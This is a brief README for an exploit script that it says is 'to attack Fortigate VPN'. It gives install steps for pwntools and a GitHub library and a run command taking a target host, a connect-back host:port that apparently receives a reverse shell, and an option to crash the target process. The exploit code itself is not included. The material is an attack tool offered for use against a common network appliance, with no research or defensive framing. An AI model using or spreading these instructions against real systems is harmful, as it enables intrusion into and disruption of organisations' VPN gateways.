This script is to attack Fortigate VPN.
Should be run on Linux systems like Ubuntu.

To execute, plz follow the below steps.
#### Prerequisites:
```bash
# Install python v3.10 or higher
$ sudo apt install python3
$ sudo apt install python3-pip
```
#### Install dependencies:
```bash
# Install pwntools
$ pip install pwntools
# Download ten from github and install
$ git clone https://github.com/cfreal/ten
$ cd ten
$ pip install .
```
#### Execution:
```bash
$ ./exploity.py <target> <local> <crash>
# Here
#   <target> is the target with format host:port
#   <local> is where to connect back to with format host:port
#   crash is whether to crash the process or not.
```
